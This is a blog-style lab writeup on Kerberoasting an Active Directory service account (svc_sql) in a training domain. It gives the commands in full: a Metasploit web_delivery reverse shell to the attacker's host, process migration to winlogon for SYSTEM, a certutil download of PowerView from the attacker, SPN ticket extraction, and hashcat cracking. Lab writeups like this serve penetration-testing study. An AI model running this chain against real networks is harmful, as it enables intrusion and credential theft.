---
title: "Kerberoasting"
categories: [Projects]
tags: [passwords, writeup, hacking, security]
hasComments: true
date: 2026-01-04
---

# Context

During this lab, I already had valid credentials and access to a web shell on the target (WEB01).
The goal was to identify a Kerberoastable account linked to the following SPN:

MSSQLSvc/SQL01.inlanefreight.local:1433


To properly enumerate Active Directory, I first needed a stable reverse shell instead of a basic web shell.

# Getting a Reverse Shell

I used Metasploit’s web_delivery module to get a Meterpreter session.

sudo msfconsole -q
search web_delivery
use exploit/multi/script/web_delivery


Then I configured the payload:

set payload windows/x64/meterpreter/reverse_tcp
set LHOST <MY_IP>
set SRVHOST <MY_IP>
set TARGET 2
exploit


Metasploit generated an encoded PowerShell command.
I copied it and executed it directly inside the Antak web shell.

After that, I got a Meterpreter session back.

# Stabilizing the Session

First thing I did was check the running processes and migrate to something more stable.

meterpreter > ps


I chose winlogon.exe since it was running as SYSTEM.

meterpreter > getpid
meterpreter > migrate <winlogon_pid>
meterpreter > getuid


# Result:

NT AUTHORITY\SYSTEM

# PowerView Setup

To enumerate domain users and SPNs, I needed PowerView.

On my machine:

wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
python3 -m http.server 8000


# On the target:

certutil.exe -f -urlcache -split http://<MY_IP>:8000/PowerView.ps1 PowerView.ps1


Then I imported it:

Import-Module .\PowerView.ps1

# Finding Kerberoastable Accounts

I listed all domain users that had an SPN:

Get-DomainUser * -SPN | select samaccountname


Among the results, the interesting one was:

svc_sql

Kerberoasting svc_sql

Next, I requested the Kerberos service ticket for that account and formatted it for Hashcat:

Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat


This gave me a TGS hash for:

MSSQLSvc/SQL01.inlanefreight.local:1433

# Cracking the Hash

I copied the hash into a file and removed all extra spaces:

tr -d "[:space:]" < raw_hash.txt > tgs_file


Then I cracked it using Hashcat (Kerberos etype 23):

hashcat -m 13100 tgs_file /usr/share/wordlists/rockyou.txt


# Password found:

:]

